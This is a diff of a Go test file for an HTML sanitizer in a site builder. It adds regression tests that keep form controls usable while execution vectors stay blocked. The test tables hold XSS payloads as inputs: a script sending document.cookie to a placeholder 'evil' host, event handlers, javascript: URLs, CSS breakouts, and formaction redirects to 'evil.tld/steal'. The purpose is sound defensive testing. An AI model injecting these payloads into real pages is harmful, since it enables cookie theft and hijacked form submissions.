@@ -75,78 +75,307 @@ func TestSanitizeCustomBlockForAstroKeepsAuthoringSurface(t *testing.T) {
 // the assertion is that the executable part is gone, not that the input was
 // rejected wholesale.
 func TestSanitizeCustomBlockForAstroStillBlocksExecution(t *testing.T) {
-	tests := []struct {
-		name      string
-		in        string
-		forbidden []string
-	}{
-		{
-			name:      "script element",
-			in:        `<div>ok</div><script>fetch("//evil/"+document.cookie)</script>`,
-			forbidden: []string{"<script", "document.cookie"},
-		},
-		{
-			name:      "event handler attribute",
-			in:        `<div onclick="alert(1)" onmouseover="alert(2)">x</div>`,
-			forbidden: []string{"onclick", "onmouseover", "alert(1)"},
-		},
-		{
-			name:      "javascript url",
-			in:        `<a href="javascript:alert(1)">x</a>`,
-			forbidden: []string{"javascript:"},
-		},
-		{
-			name:      "iframe and object",
-			in:        `<iframe src="//evil"></iframe><object data="//evil"></object>`,
-			forbidden: []string{"<iframe", "<object"},
-		},
-		{
-			name:      "style element closed early to smuggle a script",
-			in:        `<style>.a{}</style><script>alert(1)</script></style>`,
-			forbidden: []string{"<script", "alert(1)"},
-		},
-		{
-			name:      "css breaking out of its own element",
-			in:        `<style>.a{}</` + `style><img src=x onerror=alert(1)></style>`,
-			forbidden: []string{"onerror"},
-		},
-		{
-			name:      "css import fetches a remote sheet",
-			in:        `<style>@import url("//evil/x.css");.a{color:red}</style>`,
-			forbidden: []string{"@import"},
-		},
-		{
-			name:      "legacy css expression and binding",
-			in:        `<style>.a{width:expression(alert(1));-moz-binding:url(//evil)}</style>`,
-			forbidden: []string{"expression(", "-moz-binding"},
-		},
-		{
-			name:      "svg script child",
-			in:        `<svg viewBox="0 0 10 10"><script>alert(1)</script><rect></rect></svg>`,
-			forbidden: []string{"<script", "alert(1)"},
-		},
-		{
-			name:      "svg use pulling an external document",
-			in:        `<svg viewBox="0 0 10 10"><use href="https://evil/x.svg#a"></use></svg>`,
-			forbidden: []string{"https://evil"},
-		},
-		{
-			name:      "style attribute carrying a url scheme",
-			in:        `<div style="background:url(javascript:alert(1))">x</div>`,
-			forbidden: []string{"javascript:"},
-		},
-		{
-			name:      "html comment reopening markup from inside css",
-			in:        `<style>.a{}<!--</style><script>alert(1)</script>--></style>`,
-			forbidden: []string{"<script", "alert(1)"},
-		},
-	}
-	for _, tt := range tests {
+	for _, tt := range executionVectors {
 		t.Run(tt.name, func(t *testing.T) {
 			got := sanitizeCustomBlockForAstro(tt.in)
 			for _, bad := range tt.forbidden {
 				if strings.Contains(got, bad) {
 					t.Errorf("executable content survived: %q\ngot: %s", bad, got)
+				}
+			}
+		})
+	}
+}
+
+// TestExecutionVectorsStillBlockedInsideAForm re-runs every vector above with
+// the payload wrapped in the form surface that was just opened up. Allowing
+// form controls looks orthogonal to script smuggling and CSS breakout, but
+// "looks orthogonal" is how the style-slot bypass survived review, and the HTML
+// parser genuinely does treat form context differently.
+func TestExecutionVectorsStillBlockedInsideAForm(t *testing.T) {
+	for _, tt := range executionVectors {
+		t.Run(tt.name, func(t *testing.T) {
+			in := `<form action="/kontakt" method="post"><label for="a">A</label>` +
+				`<input type="text" id="a" name="a">` + tt.in +
+				`<button type="submit">Skicka</button></form>`
+			got := sanitizeCustomBlockForAstro(in)
+			for _, bad := range tt.forbidden {
+				if strings.Contains(got, bad) {
+					t.Errorf("executable content survived inside a form: %q\ngot: %s", bad, got)
+				}
+			}
+			// And the form surface itself must still be intact, so this test
+			// cannot pass by the sanitizer eating everything.
+			if !strings.Contains(got, "<button") || !strings.Contains(got, "<input") {
+				t.Errorf("the form surface was destroyed, so this vector proves nothing:\n%s", got)
+			}
+		})
+	}
+}
+
+var executionVectors = []struct {
+	name      string
+	in        string
+	forbidden []string
+}{
+	{
+		name:      "script element",
+		in:        `<div>ok</div><script>fetch("//evil/"+document.cookie)</script>`,
+		forbidden: []string{"<script", "document.cookie"},
+	},
+	{
+		name:      "event handler attribute",
+		in:        `<div onclick="alert(1)" onmouseover="alert(2)">x</div>`,
+		forbidden: []string{"onclick", "onmouseover", "alert(1)"},
+	},
+	{
+		name:      "javascript url",
+		in:        `<a href="javascript:alert(1)">x</a>`,
+		forbidden: []string{"javascript:"},
+	},
+	{
+		name:      "iframe and object",
+		in:        `<iframe src="//evil"></iframe><object data="//evil"></object>`,
+		forbidden: []string{"<iframe", "<object"},
+	},
+	{
+		name:      "style element closed early to smuggle a script",
+		in:        `<style>.a{}</style><script>alert(1)</script></style>`,
+		forbidden: []string{"<script", "alert(1)"},
+	},
+	{
+		name:      "css breaking out of its own element",
+		in:        `<style>.a{}</` + `style><img src=x onerror=alert(1)></style>`,
+		forbidden: []string{"onerror"},
+	},
+	{
+		name:      "css import fetches a remote sheet",
+		in:        `<style>@import url("//evil/x.css");.a{color:red}</style>`,
+		forbidden: []string{"@import"},
+	},
+	{
+		name:      "legacy css expression and binding",
+		in:        `<style>.a{width:expression(alert(1));-moz-binding:url(//evil)}</style>`,
+		forbidden: []string{"expression(", "-moz-binding"},
+	},
+	{
+		name:      "svg script child",
+		in:        `<svg viewBox="0 0 10 10"><script>alert(1)</script><rect></rect></svg>`,
+		forbidden: []string{"<script", "alert(1)"},
+	},
+	{
+		name:      "svg use pulling an external document",
+		in:        `<svg viewBox="0 0 10 10"><use href="https://evil/x.svg#a"></use></svg>`,
+		forbidden: []string{"https://evil"},
+	},
+	{
+		name:      "style attribute carrying a url scheme",
+		in:        `<div style="background:url(javascript:alert(1))">x</div>`,
+		forbidden: []string{"javascript:"},
+	},
+	{
+		name:      "html comment reopening markup from inside css",
+		in:        `<style>.a{}<!--</style><script>alert(1)</script>--></style>`,
+		forbidden: []string{"<script", "alert(1)"},
+	},
+}
+
+// headerOverride is a realistic header written through the global-block
+// data.html override: brand mark, a mobile-menu button carrying the state
+// attributes its script reads, an icon, and the nav itself. Sanitizing this
+// path closed a site-wide XSS hole, and the cost of that fix was every form
+// control in the markup, which is what this pins.
+const headerOverride = `<style>.site-header{display:flex;justify-content:space-between}</style>` +
+	`<header class="site-header" aria-label="Huvudmeny">` +
+	`<a class="brand-mark" href="/"><img src="/media/logo.svg" alt="Example" width="120" height="32" loading="eager"></a>` +
+	`<button class="menu-toggle" type="button" aria-expanded="false" aria-controls="huvudnav" aria-label="Meny" data-menu-toggle>` +
+	`<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"></path></svg>` +
+	`</button>` +
+	`<nav id="huvudnav" data-nav="primary"><a href="/tjanster/" data-nav="tjanster">Tjanster</a>` +
+	`<a href="/kontakt/" data-nav="kontakt" aria-current="page">Kontakt</a></nav>` +
+	`</header>`
+
+// TestGlobalHeaderOverrideSurvivesByteForByte is the ship gate for the header
+// override. Two deviations from the input are expected and pre-existing, both
+// from bluemonday's UGC policy rather than from the form work: outbound links
+// gain rel="nofollow", and valueless boolean attributes serialise as ="". They
+// are on the 2026-08-11 over-stripping list and are deliberately not addressed
+// here.
+func TestGlobalHeaderOverrideSurvivesByteForByte(t *testing.T) {
+	data, err := json.Marshal(map[string]any{"html": headerOverride})
+	if err != nil {
+		t.Fatal(err)
+	}
+	got := extractHTMLFromGlobalBlock(store.GlobalBlock{ID: "g1", Slot: "header", BlockType: "header", DataJson: string(data)})
+
+	const want = `<style>.site-header{display:flex;justify-content:space-between}</style>` +
+		`<header class="site-header" aria-label="Huvudmeny">` +
+		`<a class="brand-mark" href="/" rel="nofollow"><img src="/media/logo.svg" alt="Example" width="120" height="32" loading="eager"></a>` +
+		`<button class="menu-toggle" type="button" aria-expanded="false" aria-controls="huvudnav" aria-label="Meny" data-menu-toggle="">` +
+		`<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"></path></svg>` +
+		`</button>` +
+		`<nav id="huvudnav" data-nav="primary"><a href="/tjanster/" data-nav="tjanster" rel="nofollow">Tjanster</a>` +
+		`<a href="/kontakt/" data-nav="kontakt" aria-current="page" rel="nofollow">Kontakt</a></nav>` +
+		`</header>`
+	if got != want {
+		t.Errorf("header override changed shape\nwant: %s\ngot:  %s", want, got)
+	}
+	// Named separately, because losing any one of these is the difference
+	// between a working menu and a site that looks fine and cannot navigate.
+	for _, must := range []string{"<button", `aria-expanded="false"`, `aria-controls="huvudnav"`, "data-menu-toggle", "<svg"} {
+		if !strings.Contains(got, must) {
+			t.Errorf("mobile menu lost %q", must)
+		}
+	}
+}
+
+// TestContactFormSurvivesByteForByte pins the shape the audit measured
+// publishing as the run-on string "E-postaSkicka": every label, control and
+// button was deleted and the remaining text nodes ran together.
+func TestContactFormSurvivesByteForByte(t *testing.T) {
+	const in = `<section class="kontakt"><h2>Kontakta oss</h2>` +
+		`<form action="/api/forms/kontakt" method="post" class="kontakt-form">` +
+		`<label for="epost">E-post</label>` +
+		`<input type="email" id="epost" name="epost" placeholder="du@exempel.se" required autocomplete="email">` +
+		`<label for="meddelande">Meddelande</label>` +
+		`<textarea id="meddelande" name="meddelande" rows="5" required></textarea>` +
+		`<label for="amne">Amne</label>` +
+		`<select id="amne" name="amne"><option value="offert" selected>Offert</option><option value="support">Support</option></select>` +
+		`<button type="submit" class="btn-primary">Skicka</button>` +
+		`</form></section>`
+	const want = `<section class="kontakt"><h2>Kontakta oss</h2>` +
+		`<form action="/api/forms/kontakt" method="post" class="kontakt-form">` +
+		`<label for="epost">E-post</label>` +
+		`<input type="email" id="epost" name="epost" placeholder="du@exempel.se" required="" autocomplete="email">` +
+		`<label for="meddelande">Meddelande</label>` +
+		`<textarea id="meddelande" name="meddelande" rows="5" required=""></textarea>` +
+		`<label for="amne">Amne</label>` +
+		`<select id="amne" name="amne"><option value="offert" selected="">Offert</option><option value="support">Support</option></select>` +
+		`<button type="submit" class="btn-primary">Skicka</button>` +
+		`</form></section>`
+	got := sanitizeCustomBlockForAstro(in)
+	if got != want {
+		t.Errorf("contact form changed shape\nwant: %s\ngot:  %s", want, got)
+	}
+	if strings.Contains(got, "E-postaSkicka") {
+		t.Errorf("the 2026-08-11 run-on regression is back:\n%s", got)
+	}
+}
+
+// TestFormControlsCannotNavigateOrExecute is the security half of allowing the
+// form surface. formaction is the attribute that matters: on a submit control
+// it OVERRIDES the form's own action, and it accepts a javascript: URL, so it
+// turns a button into both a redirect primitive and a script sink. The ban is
+// verified through bluemonday rather than trusted to the allowlist omitting it.
+func TestFormControlsCannotNavigateOrExecute(t *testing.T) {
+	tests := []struct {
+		name      string
+		in        string
+		forbidden []string
+		required  []string
+	}{
+		{
+			name:      "formaction with a javascript url on a submit button",
+			in:        `<form action="/kontakt" method="post"><button type="submit" formaction="javascript:alert(document.domain)">Skicka</button></form>`,
+			forbidden: []string{"formaction", "javascript:"},
+			required:  []string{"<button", `action="/kontakt"`},
+		},
+		{
+			name:      "formaction redirecting the submission offsite",
+			in:        `<form action="/kontakt" method="post"><button type="submit" formaction="https://evil.tld/steal" formmethod="post">Skicka</button></form>`,
+			forbidden: []string{"formaction", "formmethod", "evil.tld"},
+			required:  []string{"<button"},
+		},
+		{
+			name:      "formaction on an input submit control",
+			in:        `<form action="/kontakt"><input type="submit" formaction="https://evil.tld/steal" formnovalidate value="Skicka"></form>`,
+			forbidden: []string{"formaction", "formnovalidate", "evil.tld"},
+			required:  []string{"<input"},
+		},
+		{
+			name:      "javascript url as the form action",
+			in:        `<form action="javascript:alert(1)"><button>x</button></form>`,
+			forbidden: []string{"javascript:", "action="},
+			required:  []string{"<form", "<button"},
+		},
+		{
+			name:      "scheme relative form action",
+			in:        `<form action="//evil.tld/steal"><button>x</button></form>`,
+			forbidden: []string{"evil.tld", "action="},
+			required:  []string{"<form"},
+		},
+		{
+			name:      "backslash scheme relative form action",
+			in:        `<form action="/\evil.tld/steal"><button>x</button></form>`,
+			forbidden: []string{"evil.tld", "action="},
+			required:  []string{"<form"},
+		},
+		{
+			name:      "ordinary same origin path is kept",
+			in:        `<form action="/api/forms/kontakt" method="post"><button type="submit">Skicka</button></form>`,
+			forbidden: []string{"formaction"},
+			required:  []string{`action="/api/forms/kontakt"`, `method="post"`},
+		},
+		{
+			name:      "root and fragment actions are kept",
+			in:        `<form action="/"><button>a</button></form><form action="#kontakt"><button>b</button></form>`,
+			forbidden: []string{"formaction"},
+			required:  []string{`action="/"`, `action="#kontakt"`},
+		},
+		{
+			name:      "plaintext http form action",
+			in:        `<form action="http://evil.tld/steal"><button>x</button></form>`,
+			forbidden: []string{"evil.tld", "action="},
+			required:  []string{"<form"},
+		},
+		{
+			name:      "form target breaking out of the page",
+			in:        `<form action="/kontakt" target="_blank"><button>x</button></form>`,
+			forbidden: []string{"target="},
+			required:  []string{`action="/kontakt"`},
+		},
+		{
+			name:      "event handlers on form controls",
+			in:        `<form action="/kontakt"><input type="text" name="a" onfocus="alert(1)" autofocus><button onclick="alert(2)">x</button></form>`,
+			forbidden: []string{"onfocus", "onclick", "autofocus", "alert("},
+			required:  []string{"<input", "<button"},
+		},
+		{
+			name:      "input type image is a submit control that also fetches",
+			in:        `<form action="/kontakt"><input type="image" src="https://evil.tld/px.gif" formaction="https://evil.tld/steal"></form>`,
+			forbidden: []string{`type="image"`, "formaction", "evil.tld"},
+		},
+		{
+			name:      "form attribute reparenting a control into another form",
+			in:        `<form action="/kontakt"><button type="submit" form="otherform">x</button></form>`,
+			forbidden: []string{`form="otherform"`},
+			required:  []string{"<button"},
+		},
+		{
+			name:      "button type falling outside the three keywords",
+			in:        `<form action="/kontakt"><button type="submit onclick=alert(1)">x</button></form>`,
+			forbidden: []string{"onclick", "alert(1)"},
+			required:  []string{"<button"},
+		},
+		{
+			name:      "legitimate external https endpoint is kept",
+			in:        `<form action="https://forms.example.com/f/abc123" method="post"><input type="email" name="email"><button type="submit">Skicka</button></form>`,
+			forbidden: []string{"formaction"},
+			required:  []string{`action="https://forms.example.com/f/abc123"`, `method="post"`, `type="email"`, "<button"},
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := sanitizeCustomBlockForAstro(tt.in)
+			low := strings.ToLower(got)
+			for _, bad := range tt.forbidden {
+				if strings.Contains(low, strings.ToLower(bad)) {
+					t.Errorf("%q survived: %s", bad, got)
+				}
+			}
+			for _, must := range tt.required {
+				if !strings.Contains(got, must) {
+					t.Errorf("%q was stripped: %s", must, got)
 				}
 			}
 		})
